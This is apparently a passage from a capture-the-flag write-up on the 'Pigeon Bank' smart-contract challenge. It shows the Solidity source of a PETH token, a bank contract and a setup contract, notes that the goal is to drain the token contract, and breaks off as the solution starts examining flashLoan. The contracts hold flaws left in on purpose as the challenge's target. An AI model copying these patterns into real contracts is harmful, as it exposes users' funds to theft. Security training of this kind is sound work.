</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">PETH</span> <span class="k">is</span> <span class="n">Ownable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span> <span class="k">payable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">public</span> <span class="k">constant</span> <span class="nb">name</span> <span class="o">=</span> <span class="s">&#34;Pigeon ETH&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">symbol</span> <span class="o">=</span> <span class="s">&#34;PETH&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">decimals</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Approval</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">src</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Transfer</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">src</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Deposit</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">Withdrawal</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">src</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="k">public</span> <span class="n">allowance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">revert</span><span class="p">(</span><span class="s">&#34;PETH: Do not send ETH directly&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Deposit</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// return msg.value;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_wad</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">_wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_burn</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="n">_wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// require(success, &#34;SEETH: withdraw failed&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">emit</span> <span class="n">Withdrawal</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="n">_wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="n">_userAddress</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_burnAll</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// require(success, &#34;SEETH: withdraw failed&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">emit</span> <span class="n">Withdrawal</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">_userAddress</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">totalSupply</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">guy</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">allowance</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">guy</span><span class="p">]</span> <span class="o">=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Approval</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">guy</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="n">src</span><span class="p">,</span> <span class="kt">address</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">src</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">&amp;&amp;</span> <span class="n">allowance</span><span class="p">[</span><span class="n">src</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">allowance</span><span class="p">[</span><span class="n">src</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">allowance</span><span class="p">[</span><span class="n">src</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">-=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">+=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_wad</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">_wad</span> <span class="o">&lt;=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">,</span> <span class="s">&#34;PETH: wad exceeds balance&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">),</span> <span class="s">&#34;PETH: Borrower must be a contract&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">userBalanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// @dev Send Ether to borrower (Borrower must implement receive() function)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// (bool success, bytes memory returndata) = target.call{value: value}(data);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Address</span><span class="p">.</span><span class="n">functionCallWithValue</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="nb">data</span><span class="p">,</span> <span class="n">_wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">userBalanceAfter</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">userBalanceAfter</span> <span class="o">&gt;=</span> <span class="n">userBalanceBefore</span><span class="p">,</span> <span class="s">&#34;PETH: You did not return my Ether!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// @dev if user gave me more Ether, refund it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">userBalanceAfter</span> <span class="o">&gt;</span> <span class="n">userBalanceBefore</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">refund</span> <span class="o">=</span> <span class="n">userBalanceAfter</span> <span class="o">-</span> <span class="n">userBalanceBefore</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">payable</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="n">refund</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ========== INTERNAL FUNCTION ==========
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">dst</span><span class="p">]</span> <span class="o">+=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_burn</span><span class="p">(</span><span class="kt">address</span> <span class="n">src</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">balanceOf</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">src</span><span class="p">]</span> <span class="o">-=</span> <span class="n">wad</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_burnAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_burn</span><span class="p">(</span><span class="n">_userAddress</span><span class="p">,</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">_userAddress</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This contract is trying to implement a coin. Skimming through it, one thing that is interesting is that it has <code>flashLoan</code> feature. Another thing is that some functions can only be called by the owner of the contract.</p>
<p><strong>PigeonBank.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/security/ReentrancyGuard.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./PETH.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Deposit Ether to PigeonBank to get PETH
</span></span></span><span class="line"><span class="cl"><span class="c1">// @TODO: Implement interest rate feature so that users can get interest by depositing Ether
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">PigeonBank</span> <span class="k">is</span> <span class="n">ReentrancyGuard</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span> <span class="k">payable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PETH</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">peth</span><span class="p">;</span> <span class="c1">// @dev - Created by the SEE team. Pigeon Bank is created to allow citizens to deposit Ether and get SEETH and earn interest to survive the economic crisis.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="k">private</span> <span class="n">_owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PETH</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">_owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">nonReentrant</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">public</span> <span class="n">nonReentrant</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">wad</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawAll</span><span class="p">()</span> <span class="k">public</span> <span class="n">nonReentrant</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span><span class="p">.</span><span class="n">withdrawAll</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span><span class="kt">address</span> <span class="n">receiver</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">wad</span><span class="p">)</span> <span class="k">public</span> <span class="n">nonReentrant</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">wad</span><span class="p">,</span> <span class="nb">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This contract is the bank, which is actually the owner of the <code>PETH</code> contract (because this contract is the one who deploy the <code>PETH</code> contract in constructor). One thing that is interesting is that all of the functions are set to <code>nonReentrant</code>, which used to prevent reentrancy attack.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./PETH.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./PigeonBank.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PETH</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">peth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PigeonBank</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">pigeonBank</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// @dev - The SEE Team provided 2500 ETH to PigeonBank to provide liquidity so that the bank stays solvent.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">2500</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Setup: msg.value must be 2500 ether&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pigeonBank</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PigeonBank</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">peth</span> <span class="o">=</span> <span class="n">pigeonBank</span><span class="p">.</span><span class="n">peth</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// @dev - Deposit 2500 ETH to PigeonBank
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pigeonBank</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">assert</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pigeonBank</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">assert</span><span class="p">(</span><span class="n">peth</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="mi">2500</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">peth</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="mi">2500</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is the setup contract, and to solve the challenge, we need to drain the <code>PETH</code> contract and make our <code>msg.sender</code> balance to be &gt;= 2500 ether.</p>
<h3 id="solution-2">Solution</h3>
<p>First, let&rsquo;s check the <code>flashLoan</code> feature.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span><span class="kt">address</span> <span class="n">_userAddress</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_wad</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
